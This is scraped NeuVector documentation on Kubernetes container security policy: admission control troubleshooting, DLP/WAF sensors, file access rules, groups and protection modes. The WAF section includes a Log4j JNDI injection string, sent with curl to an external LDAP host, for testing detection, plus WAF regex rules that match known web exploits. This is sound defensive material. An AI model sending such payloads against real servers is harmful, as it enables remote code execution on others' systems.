'*' apiVersions: - v1 - v1beta1 operations: - UPDATE resources: - daemonsets - deployments - replicationcontrollers - statefulsets - services scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - DELETE resources: - daemonsets - deployments - services - statefulsets scope: '*' sideEffects: Unknown timeoutSeconds: 30 kind: List metadata: resourceVersion: &quot;&quot; selfLink: &quot;&quot;   If you see any content like &quot;Error from server ....&quot; or &quot;... is forbidden&quot;, it means the NV controller service account doesn't have access right for ValidatingWebhookConfiguration resource. In this case it usually means the neuvector-binding-admission clusterrole/clusterrolebinding has some issue. Deleting and recreating neuvector-binding-admission clusterrole/clusterrolebinding usually the fastest fix.  Test the Admission Control Connection Button  In the NeuVector Console in Policy -&gt; Admission Control, go to More Operations -&gt; Advanced Setting and click the &quot;Test&quot; button. NeuVector will modify service neuvector-svc-admission-webhook and see if our webhook server can receive the change notifification or if it fails.  Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like:  apiVersion: v1 kind: Service metadata: annotations: ................... creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment tag-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment name: neuvector-svc-admission-webhook namespace: neuvector ................... spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   Now click admission control's advanced setting =&gt; &quot;Test&quot; button. Wait until it shows success or failure. NeuVector will modify the service neuvector-svc-admission-webhook's tag-neuvector-svc-admission-webhook label implicitly. Wait for controller internal operation. If the NeuVector webhook server receives update request from kube-apiserver about this service change, NeuVector will modify the service neuvector-svc-admission-webhook's echo-neuvector-svc-admission-webhook label to the same value as tag-neuvector-svc-admission-webhook label. Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like   apiVersion: v1 kind: Service metadata: annotations: ............. creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568225712&quot; //===&gt; changed in step 3-3 after receiving request from kube-apiserver tag-neuvector-svc-admission-webhook: &quot;1568225712&quot; //===&gt; changed in step 3-2 because of UI operation name: neuvector-svc-admission-webhook namespace: neuvector ................. spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   After the test, if the value of label tag-neuvector-svc-admission-webhook doesn't change, it means the controller service fails to update neuvector-svc-admission-webhook service. Check if neuvector-binding-app clusterrole/clusterrolebinding are configured correctly. After the test, if the value of label tag-neuvector-svc-admission-webhook is changed but not the value of label echo-neuvector-svc-admission-webhook, it means the webhook server didn't receive the request from the kube-apiserver. The kub-apiserver's request can't reach the NeuVector webhook server. The cause of this could be network connectivity issues, firewalls blocking the request (on default port 443 in), the resolving of the wrong IP for the controller or others. ","version":"Next 🚧","tagName":"h3"},{"title":"DLP & WAF Sensors","type":0,"sectionRef":"#","url":"/next/policy/dlp","content":"","keywords":"","version":"Next 🚧"},{"title":"Data Loss Prevention (DLP) and Web Application Firewall (WAF)​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/next/policy/dlp#data-loss-prevention-dlp-and-web-application-firewall-waf","content":" DLP and WAF uses the Deep Packet Inspection (DPI) of NeuVector to inspect the network payloads of connections for sensitive data violations. NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.  DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.  Configuring DLP or WAF is a two step process:  Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.Apply the desired sensor to a Group, in the Policy -&gt; Groups screen.  WAF Sensors​  WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.  This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.  Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).    DLP Sensors​  DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.    Configuring DLP and WAF sensors​  The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:  Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the &quot;Not Have&quot; operator be combined in the rule with a pattern using the &quot;Have&quot; operator because a single pattern with &quot;Not Have&quot; operator will not be effective.Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.    Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.  Example of a DLP rule with a Have/Not Have pattern: Have:  \\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b   This produces a false positive match for &quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998&quot;:  docker exec -ti httpclient sh / # curl -d &quot;{\\&quot;context\\&quot;: \\&quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\&quot;}&quot; 172.17.0.5:8080/ Hello, world!   Adding a Not Have pattern removes the false positive:  istio\\_(\\w){5}   Sensors must be applied to a Group to become effective.  Applying DLP/WAF Sensors to Container Groups​  To activate a DLP or WAF sensor, go to Policy -&gt; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).  It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone. For example, if the Group selected is the reserved group 'containers', and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.  It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).    DLP/WAF Behavior Summary  DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.Any traffic passing in and out of a DLP group is scanned for pattern matches.Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).Multiple alerts are generated for a single packet if it matches multiple rules.For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.PCRE is used for pattern matching.Hyper scan library is used for efficient, scalable and high-performance pattern matching.  DLP/WAF Actions in Discover, Monitor, Protect Modes​  When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:  Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.Protect mode. The action will be to alert if set to Alert, or block if set to Deny.  Log4j Detection WAF Pattern​  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.  \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*   Also note that there are ways that attackers could bypass detection by such rules.  Testing the Log4j WAF Detection​  In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:  User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}   Using curl to POST data to server(container) can help to test WAF rule:  curl -X POST -k -H &quot;X-Auth-Token: $_TOKEN_&quot; -H &quot;Content-Type: application/json&quot; -H &quot;User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}&quot; -d '$SOME_DATA' &quot;http://$SOME_IP_:$PORT&quot;   WAF Setup and Testing​  The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it.  Download WAF test script  Sample Alerts​  DLP match in Discover or Monitor Mode    DLP match in Protect Mode    DLP Security Event Notification for Credit Card Match    note The automated packet capture will contain the actual packet including the credit card number matched. This is also true of any DLP packet capture for any sensitive data.  ","version":"Next 🚧","tagName":"h3"},{"title":"Managing WAF Rules Using Import/Export or CRDs​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/next/policy/dlp#managing-waf-rules-using-importexport-or-crds","content":" It is possible to import or export WAF rules from the WAF screen. This can be useful to be able to propagate rules to other clusters, make a backup, or prepare them for applying as a CRD.  In order to create WAF sensors or apply a WAF sensor to a group using CRDs, make sure the appropriate NVWafSecurityRule cluster role binding is created.  Sample WAF sensor CRD  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvWafSecurityRule metadata: name: sensor.execution spec: sensor: comment: arbitrary command execution attempt name: sensor.execution rules: - name: Alchemy patterns: - context: url key: pattern op: regex value: \\/NUL\\/.*\\.\\.\\/\\.\\.\\/ - name: Log4j patterns: - context: header key: pattern op: regex value: \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.* - name: formmail patterns: - context: url key: pattern op: regex value: \\/formmail - context: packet key: pattern op: regex value: \\x0a - name: CCBill patterns: - context: url key: pattern op: regex value: \\/whereami\\.cgi?.*g= - name: DotNetNuke patterns: - context: url key: pattern op: regex value: \\/Install\\/InstallWizard.aspx.*executeinstall - name: HNAP patterns: - context: url key: pattern op: regex value: \\/tmUnblock.cgi - context: header key: pattern op: regex value: 'Authorization: Basic\\s*YWRtaW46' - name: Magento patterns: - context: url key: pattern op: regex value: \\/Adminhtml_.*forwarded= - name: b2 patterns: - context: url key: pattern op: regex value: \\/b2\\/b2-include\\/.*b2inc.*http\\x3a\\/\\/ - name: bat patterns: - context: url key: pattern op: regex value: x2ebat\\x22.*?\\x26 - name: eshop.pl patterns: - context: url key: pattern op: regex value: \\/eshop\\.pl?.*seite=\\x3b - name: whois_raw.cgi patterns: - context: url key: pattern op: regex value: \\/whois_raw\\.cgi? - context: packet key: pattern op: regex value: \\x0a kind: List metadata: null   Sample CRD to apply a WAF sensor to a Group  apiVersion: v1 items: - apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: demo-group namespace: demo spec: egress: [] file: [] ingress: [] process: [] process_profile: baseline: default target: policymode: N/A selector: comment: &quot;&quot; criteria: - key: domain op: = value: demo - key: service op: = value: nginx-pod.demo - key: service op: = value: node-pod.demo name: demo-group original_name: &quot;&quot; waf: settings: - action: deny name: sensor.cross - action: deny name: sensor.execution - action: deny name: sensor.injection - action: deny name: sensor.traversal - action: deny name: wafsensor-1 status: true kind: List metadata: null   See the CRD section for more details on working with CRDs.  ","version":"Next 🚧","tagName":"h3"},{"title":"DLP/WAF Response Rules​","type":1,"pageTitle":"DLP & WAF Sensors","url":"/next/policy/dlp#dlpwaf-response-rules","content":" Response rules based on DLP/WAF security events can be created in Policy -&gt;Response Rules. Start type DLP or WAF and the dropdown will list all sensors and patterns available to create rules.   ","version":"Next 🚧","tagName":"h3"},{"title":"Federated Policy","type":0,"sectionRef":"#","url":"/next/policy/federated","content":"","keywords":"","version":"Next 🚧"},{"title":"Federated Policy​","type":1,"pageTitle":"Federated Policy","url":"/next/policy/federated#federated-policy","content":" After a Master cluster has been created, Federated rules can be created in the Master which are automatically propagated to each cluster. This is useful to create global rules that should be applied to each cluster, such as global network rules. Federated rules will appear in every cluster as read-only and can NOT be deleted or edited by the local admin of the cluster.  To configure Federated rules, click on Federated Policy in the upper right drop down menu. You will see tabs for Groups, Admission Control, Network Rules and other rules which can be federated. Select the tab and create a new Group or rule. In the sample below, two Federated groups have been created, which will be propagated to each cluster.    And the following Federated Network Rule has been created to allow access of SSL from the node demo pods to google.com.    After these rules and groups have been propagated to the remote cluster(s), they will appear as Federated rules and groups in the local cluster's console.    In the above example, the Federated rule is shown which is different than learned rules and 'user created' rules which were created in the local cluster. The user created rule 1 can be selected for editing or deletion while the Federated can not. In addition, Federated network rules will always show at the top of the list, thus taking precedence over other rules.  Other rules such as Admission Control, Response, Process and File will behave in the same way, except that the order of rules is only relevant for the Network rules.  Note that the configuration of Process and File rules requires the selection of a Federated Group, as these must be applied to a target group as defined in the Federated Group tab. After a new Group has been configured in Federated -&gt; Groups, it will show as a selectable option when configuring a group in Process or File rules. ","version":"Next 🚧","tagName":"h3"},{"title":"File Access Rules","type":0,"sectionRef":"#","url":"/next/policy/filerules","content":"","keywords":"","version":"Next 🚧"},{"title":"Policy: File Access Rules​","type":1,"pageTitle":"File Access Rules","url":"/next/policy/filerules#policy-file-access-rules","content":" There are two types of Process/File protections in NeuVector. One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  NeuVector has built-in detection of suspicious file system activity. Sensitive files in containers normally do not change at run-time. By modifying the content of the sensitive files, an attacker can gain unauthorized privileges, such as in the Dirty-Cow linux kernel attack, or damage the system’s integrity, for example by manipulating the /etc/hosts file. Most containers don't run in read-only mode. Any suspicious activity in containers, hosts, or the NeuVector Enforcer container itself will be detected and logged into Notifications -&gt; Security Events.  Zero-drift File Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require file activity to be added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic File Protections​  If a package installation is detected, an automatic re-scan of the container or host will be triggered to detect any vulnerabilities, IF auto-scan has been enabled in Security Risks -&gt; Vulnerabilities.  In addition to monitoring predefined files/directories, users can add custom files/directories to be monitored, and block such files/directories from being modified.  important NeuVector alerts, and does not block modifications to predefined files/directories or in system containers such as Kubernetes ones. Blocking is only an option for user configured custom files/directories for non-system containers. This is so that regular updates of system folder or sensitive configurations are not blocked unintentionally, resulting in erratic system behavior.  The following files and directories are monitored by default:  Executable filesSensitive setuid/setgid filesSystem libraries, libc, pthread, ...Package installation, Debian/Ubuntu, RedHat/CentOS, AlpineSensitive system files, /etc/passwd, /etc/hosts, /etc/resolv.conf …Running processes' executable files  The following activities are monitored:  Files, directories, symlinks (hard link and soft link)created, deleted, modified (content change) and moved  Below is a list of the file system monitoring and what is monitored (container, host/node, and/or NeuVector enforcer container itself):  /bin, /usr/bin, /usr/sbin, /usr/local/bin - container, enforcerFiles of setuid and setgid attribute - container, host, enforcerLibraries: libc, pthread, ld-linux.* - container, host, enforcerPackage installation: dpkg, rpm, apk - container, host, enforcer/etc/hosts, /etc/passwd, /etc/resolv.conf - container, host, enforcerBinaries of the running processes - container  Behavioral-learning based Allowed Applications in Discover Mode​  When in Discover mode, NeuVector can learn and whitelist applications ONLY for specified directories or files. To enable learning, a custom rule must be created and the Action must be set to Block, as described below.  Creating Custom File/Directory Monitoring Rules​  Custom file access rules can be created for both custom user-defined Groups as well as auto-learned Groups.  Users can add new entries for file/directory rules.  Filter: Configure the file/folder to be protected (wildcards are supported)Set the recursive flag (if all files in the subdirectories are to be protected)Select the action, Monitor or Block (see Actions below)Enter allowed applications (see Note1 below)    Actions:  Monitor file changes. Generate alerts (Notifications) for any changesBlock unauthorized access. Service in Discover mode: the file access behavior is learned (the processes/applications that access the protected file) and added to the Allowed Applications.Service in Monitor mode: unexpected file behavior is alerted.Service in Protect mode: unexpected access (read, modify) is blocked. New file creation in protected folders will be blocked as well.  note If the rule is set to Block, and the service is in Discover mode, NeuVector will learn the applications accessing the file and add these to the Allowed Applications for the rule.  note Container platforms running the AUFS storage driver will not support the deny (block) action in Protect mode for creating/modifying files due to the limitations of the driver. The behavior will be the same a Monitor mode, alerting upon suspicious activity.  File access rule order precedence​  A container can inherit file access rule from multiple custom groups and user created file access rule on auto learned group.  File access rules are prioritized in the order below if the file name conflicts with predefined access rules of auto learned group and rules inheritance of multiple groups.  File access rule with block access (highest order)File access rule with recursive enabledFile access rule with recursive disableUser created file access rule other than predefined file access rules  Examples​  Showing file access rule to protect /etc/hostname file of node-pod service and allow vi application to modify the file.    Showing file access rule to protect files under /var/opt/ directory recursively for modification as well reading. The Allowed Application python can have read and modify access to these files.    Showing access rule that protects file /etc/passwd, which is one of the files covered predefined access rule in order to modify the file access action, for modification as well reading. This custom rule changes the default action of the predefined file access rule. The application Nano can have 'read and modify' access to these files. Must also add the Nano application (process) as an 'allow' rule in the process profile rule for this service to run Nano application inside the service (if it wasn't already whitelisted there), otherwise the process will be blocked by NeuVector.    Showing that the application python was learned accessing file under /var/opt directory when service mode of node-pod was in Discover. This occurs only when the rule is set to Block and the service is in Discover mode.    Showing predefined file access rules for the service node-pod.demo-nvqa. This can be viewed for this service by clicking the info icon “show predefined filters” in the right corner of the file access rule tab.    Showing a sample security event in Notifications -&gt; Security Events, alerted as File access denial when modification of the file /etc/hostname by the application python was denied due to a custom file access rule with block action.    Other Responses​  If other special mitigations, responses, or alerts are desired for File System Violations, a Response Rule can be created. See the example below and the section Run-Time Security Policy -&gt; Response Rules for more details.    ","version":"Next 🚧","tagName":"h3"},{"title":"Split Mode File Protections​","type":1,"pageTitle":"File Access Rules","url":"/next/policy/filerules#split-mode-file-protections","content":" Container Groups can have Process/File rules in a different mode than Network rules, as described here. ","version":"Next 🚧","tagName":"h3"},{"title":"Groups","type":0,"sectionRef":"#","url":"/next/policy/groups","content":"","keywords":"","version":"Next 🚧"},{"title":"Policy: Groups​","type":1,"pageTitle":"Groups","url":"/next/policy/groups#policy-groups","content":" This menu is the key area to view and manage security rules and customize Groups for use in rules. It is also used to switch modes of Groups between Discover, Monitor, and Protect. Container Groups can have Process/File rules in a different mode than Network rules, as described here. Please see the following individual sections for explanations of Custom Compliance Checks, Network Rules, Process and File Access Rules and DLP/WAF detection. Note: Network rules can be viewed in the Groups menu for any group, but must be edited separately in the Network Rules menu.  NeuVector automatically creates Groups from your running applications. These groups start with the prefix 'nv.' You can also manually add them using a CRD or the REST API and can be created in any mode, Discover, Monitor, or Protect. Network and Response Rules require these Group definitions. For automatically created Groups ('learned' groups starting with 'nv'), NeuVector will learn the network and process rules and add them while in Discover mode. Custom Groups will not auto-learn and populate rules. Note: 'nv.' groups start with zero drift enabled by default for process/file protections.    It is convenient to see groups of containers and apply rules to each group. NeuVector creates a list of groups based on the container images. For example, all containers started from one Wordpress image will be in the same group. Rules are automatically created and applied to the group of containers.  The Groups screen also displays a 'Scorable' icon in the upper right, and a learned group can be selected and the Scorable checkbox enabled or disabled. This controls which containers are used to calculate the Security Risk Score in the Dashboard. See Improve Security Risk Score for more details.  The Groups screen is also where the CRD yaml file for 'security policy as code' can be imported and exported. Select one or more groups and click on the Export Group policy button to download the yaml file. See the CRD section for more details on how to use CRDs. Important: Each selected group AND any linked groups through network rules will be exported (i.e. the group and any other group it connects to through the whitelist network rules).  Auto Deletion of Unused Groups​  Learned groups (not reserved or custom groups) can be automatically deleted by NeuVector if there are no members (containers) in the group. The time period for this is configurable in Settings -&gt; Configuration.  Host Protection - the 'Nodes' Group​  NeuVector automatically creates a group called 'nodes' which represents each node (host) in the cluster. NeuVector provides automated basic monitoring of hosts for suspicious processes (such as port scans, reverse shells etc.) and privilege escalations. In addition, NeuVector will learn the process behavior of each node while it is in Discover mode to whitelist those processes, similar to how it is done with container processes. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  The nodes can then be put into the Monitor or Protect mode, where NeuVector will alert is any process starts while in Monitor mode, and block that process in Protect mode.    To enable host protection with process profile rules, select the 'nodes' group and review the learned processes on the node. Customize if needed by adding, deleting or editing process rules. Then switch the mode to Monitor or Protect.  note Network connection violations of rules shown in the Network Rules for Nodes are never blocked, even in Protect mode. Only process violations are blocked in Protect mode on nodes.  Custom Groups​  Groups can be manually added by entering the criteria for the group. Note: Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Groups can be created by:  Images  Select containers by their image names. Examples: image=wordpress, image@redis  Nodes  Select containers by nodes on which they are running. Examples: node=ip-12-34-56-78.us-west-2  Individual containers  Select containers by their instance names. Examples: container=nodejs_1, container@nodejs  Services  Select containers by their services. If a container is deployed by Docker Compose, its service tag value will be &quot;project_name:service_name&quot;; if a container is deployed by Docker swarm mode service, its service tag value will be the swarm service name.  Labels  Select containers by their labels. Examples: com.docker.compose.project=wordpress, location@us-west  Addresses  Create a group by DNS name or IP address ranges. Examples: address=www.google.com, address=10.1.0.1, address=10.1.0.0/24, address=10.1.0.1-10.1.0.25. DNS name can be any name resolvable. Address criteria do not accept the != operator. See below for special virtual host 'vh' address groups.  A group can be created with mixed criteria types, except the 'address' type, which cannot be used together with other criteria. Mixed criteria enforces an ‘AND’ operation between the criteria, for example label service_type=data AND image=mysql. Multiple entries for one or criteria are treated as OR, for example address=google.com OR address=yahoo.com. Note: To assist in analyzing ingress/egress connections, a list of ingress and egress IPs can be downloaded from the Dashboard -&gt; Ingress/Egress details section as an Exposure Report.  Partial matching is supported for image, node, container, service and label criteria. For example, image@redis, selects containers whose image name contains 'redis' substring; image^redis, selects containers whose image name starts with 'redis'.  It is not recommended to use address criteria to match internal IPs or subnets, especially those protected by enforcers, instead, using their meta data, such as image, service or labels, is recommended. The typical use cases for address group are to define policies between managed containers and external IP subnets, for example, services running on Internet or another data center. Address group does not have group members.  Wildcards '' can be used in criteria, for example 'address=.google.com'. For more flexible matching, use the tilde '' to indicate a regex match is desired. For example to match labels 'policypublic.*-ext1' for the label policy.  note Special characters used after an equals '=' in criteria may not match properly. For example the dot '.' In 'policy=public.' will not match properly, and regex match should be used instead, like 'policy~public.'  After saving a new group, NeuVector will display the members in that group. Rules can then be created using these groups.  Virtual Host ('vh') Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.  ","version":"Next 🚧","tagName":"h3"},{"title":"Custom Group Examples​","type":1,"pageTitle":"Groups","url":"/next/policy/groups#custom-group-examples","content":" General Criteria​  To select all containers (either example below will work)  container=∗ service=∗  To select all containers in the namespace 'default' (namespace supported from v2.2)  namespace=default  To select all containers whose service name starts with 'nginx'  service=nginx∗  To select all containers whose service name contains 'etcd'  service=∗etcd∗  To select all containers in the namespace 'apache1' or 'apache2' (hit enter after each entry)  namespace=apache1 namespace=apache2  To select all containers NOT in the namespace 'apache1' and 'apache2' (hit enter after each entry)  namespace!=apache1 namespace!=apache2  To select all containers in the namespace 'apache1~9'  namespace~apache[1-9]  IP Address Criteria​  All external IP addresses  Please use the default group ‘external’ in rules  IP subnet 10.0.0.0/8  address=10.0.0.0/8  IP range  address=10.0.0.0-10.0.0.15  dropbox.com and it's subdomains (hit enter after each entry)  address=dropbox.com address=*.dropbox.com ","version":"Next 🚧","tagName":"h3"},{"title":"Security Policy Overview","type":0,"sectionRef":"#","url":"/next/policy/overview","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector Security Policy​","type":1,"pageTitle":"Security Policy Overview","url":"/next/policy/overview#neuvector-security-policy","content":" To detect Violations of normal behavior, NeuVector maintains a security Policy which can be managed from the GUI, CLI, CRD, or REST API.  Groups​  This provides the primary view of service Groups and custom Groups to set the mode (Discover, Monitor, Protect) for each service and to manage rules. Groups are automatically created by NeuVector, but custom groups can be added. Rules for each Group are automatically created by NeuVector when containers begin running. Container Groups can have a Split Policy Mode where the Process/File rules are in a different enforcement mode than the Network rules, as described here.  To select a Group to view or manage, select the check box next to it. This is where Process Profile Rules, File Access Rules, DLP, and Custom Compliance checks are managed. Network Rules can be viewed here but are managed in a separate menu. Network and Response Rules in NeuVector are created using a ‘from’ and ‘to’ field, which requires a Group as input. A group can be an application, derived from image labels, DNS name or other customized grouping. DNS subdomains are supported, e.g. *.foo.com. IP addresses or subnets can also be used which is useful to control ingress and egress from non-containerized workloads.    Reserved group names created automatically by NeuVector include:  Containers. All running containers.External. Connections coming into the cluster (ingress).Nodes. Nodes or hosts identified by NeuVector.  The Groups menu is also where the &quot;Export Group Policy&quot; can be performed. This exports the security policy (rules) for the selected groups as a yaml file in the format of the NeuVector custom resource definition (CRD) which can be reviewed and then deployed into other clusters.  Note that the Status of a Group's containers is shown in Policy -&gt; Groups -&gt; Members, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Network Rules​  A list of whitelist and blacklist rules for NeuVector to enforce. NeuVector can auto-discover and create a set of whitelist rules while in Discover mode. Rules can be added manually if desired.  NeuVector automatically creates Layer 7 (application layer) whitelist rules when in Discover mode, by observing the network connections and creating rules which enforce application protocols.  NeuVector also has built-in network attack detection which is enabled all the time, regardless of mode (Discover, Monitor, Protect). The network threats detected include DDoS attacks, tunneling and SQL injection. Please see the section Network Rules for a full list of built-in threat detection.  DLP (Data Loss Prevention) rules can also be applied to container Groups to inspect the network payload for potential data stealing or privacy violations such as unencrypted credit card data. Violations can be blocked. Please see the section on DLP for details on how to create and apply DLP filters.  Process Profile and File Access Rules​  NeuVector has built-in detection of suspicious processes and file activity as well as a baselining technology for containers. Built-in detection includes processes such as port scanning (e.g. NMAP), reverse shell, and even privilege escalations to root. System files and directories are automatically monitored. Each service discovered by NeuVector will create a baseline of ‘normal’ process and file behavior for that container service. These rules can be customized if desired.  Response Rules​  Response Rules enable users to define actions to respond to security events. Events include Threats, Violations, Incidents, and Vulnerability Scan results. Actions include container quarantine, webhooks, and suppression of alerts.  Response Rules provide a flexible, customizable rule engine to automate responses to important security events.  Admission Control Rules​  Admission control rules allow or block deployments. More details can be found in this section under Admission Controls.  DLP and WAF Sensors​  Data Loss Prevention (Data Leak Protection) and WAF rules can be enabled on any selected container Group. This utilizes Deep Packet Inspection to apply regular expression based matching to the network payload entering or leaving the selected container group. Built-in sensors for credit card and US social security number are included for examples, and custom regular expressions can be added.  Migration, Backup, Import/Export​  Migration of the security policy can be accomplished by CRD, REST API, or import/export. For example, learned and custom rules can generate a CRD yaml file(s) in a staging environment for deployment to the production environment.  The Security Policy for NeuVector can be exported and imported in Settings -&gt; Configuration. It is recommended to backup All configuration prior to any update of NeuVector to a new version.  important Importing ALL (Config and Policy) will overwrite everything, including the main admin login credential. Be sure you know the main admin login for the imported file before importing. ","version":"Next 🚧","tagName":"h3"},{"title":"Modes: Discover, Monitor, Protect","type":0,"sectionRef":"#","url":"/next/policy/modes","content":"","keywords":"","version":"Next 🚧"},{"title":"NeuVector Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/next/policy/modes#neuvector-modes","content":" The NeuVector Violation Detection module has three modes: Discover, Monitor, and Protect. At any point in time, any Group (beginning with 'nv', or the 'Nodes' group) can be in any of these modes. The mode can be switched from the Groups menu, Network Activity view, or the Dashboard. Container Groups can have Process/File rules in a different mode than Network rules, as described here.    note Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Discover​  By default, NeuVector starts in Discover mode. In this mode, NeuVector:  Discovers your container infrastructure, including containers, nodes, and hosts.Learns your applications and behaviors by observing conversations (network connections) between containers.Identifies separate services and applications running.Automatically builds a whitelist of Network Rules to protect normal application network behavior.Baselines the processes running in containers for each service and creates whitelist Process Profile Rules.  note To determine how long to run a service in Discover mode, run test traffic through the application and review all rules for completeness. Several hours should be sufficient, but some applications may require a few days to be fully exercised. When in doubt, switch to Monitor mode and check for violations, which can then be converted to whitelist rules before moving to Protect mode.  